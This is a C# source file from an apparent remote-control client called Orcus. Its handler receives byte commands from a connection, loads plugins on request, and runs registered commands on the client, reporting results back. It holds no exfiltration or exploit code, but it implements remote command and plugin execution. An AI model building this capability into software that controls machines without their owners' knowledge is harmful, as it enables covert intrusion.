using System;
using System.Linq;
using Orcus.Plugins;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.Commands.ClientCommands;
using Orcus.StaticCommandManagement;

namespace Orcus.Commands.ClientCommands
{
    public class ClientCommandsCommand : Command
    {
        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            switch ((ClientCommandsCommunication) parameter[0])
            {
                case ClientCommandsCommunication.SendCommand:
                case ClientCommandsCommunication.SendCommandWithPlugin:
                    var commandGuid = new Guid(parameter.Skip(1).Take(16).ToArray());
                    byte[] commandParameter;

                    if (parameter[0] == (byte) ClientCommandsCommunication.SendCommandWithPlugin)
                    {
                        if (!StaticCommandSelector.Current.LoadStaticCommandPlugin(BitConverter.ToInt32(parameter, 33),
                            parameter.Skip(17).Take(16).ToArray()))
                        {
                            ResponseByte((byte) ClientCommandsCommunication.ResponseFailedLoadingPlugin, connectionInfo);
                            return;
                        }

                        commandParameter = new byte[parameter.Length - 37];
                        Array.Copy(parameter, 37, commandParameter, 0, commandParameter.Length);
                    }
                    else
                    {
                        commandParameter = new byte[parameter.Length - 17];
                        Array.Copy(parameter, 17, commandParameter, 0, commandParameter.Length);
                    }

                    var feedbackFactory = new ClientCommandsFeedbackFactory(connectionInfo, this);
                    StaticCommand staticCommand;
                    if (StaticCommandSelector.Current.StaticCommands.TryGetValue(commandGuid, out staticCommand))
                    {
                        try
                        {
                            staticCommand.Execute(new CommandParameter(commandParameter), feedbackFactory,
                                connectionInfo.ClientInfo);
                        }
                        catch (Exception ex)
                        {
                            feedbackFactory.Failed("Critical error: " + ex.Message);
                        }

                        //that will execute anyways only if it wasn't pushed yet
                        feedbackFactory.Succeeded();
                    }
                    break;
                case ClientCommandsCommunication.CheckIsPluginAvailable:
                    var pluginAvailable =
                        StaticCommandSelector.Current.CheckPluginAvailable(parameter.Skip(1).Take(16).ToArray());

                    connectionInfo.UnsafeResponse(this, 18, writer =>
                    {
                        writer.Write((byte) ClientCommandsCommunication.ResponseCheckPluginAvailable);
                        writer.Write(pluginAvailable ? (byte) 1 : (byte) 0);
                        writer.Write(parameter, 1, 16);
                    });
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        protected override uint GetId()
        {
            return 31;
        }
    }
}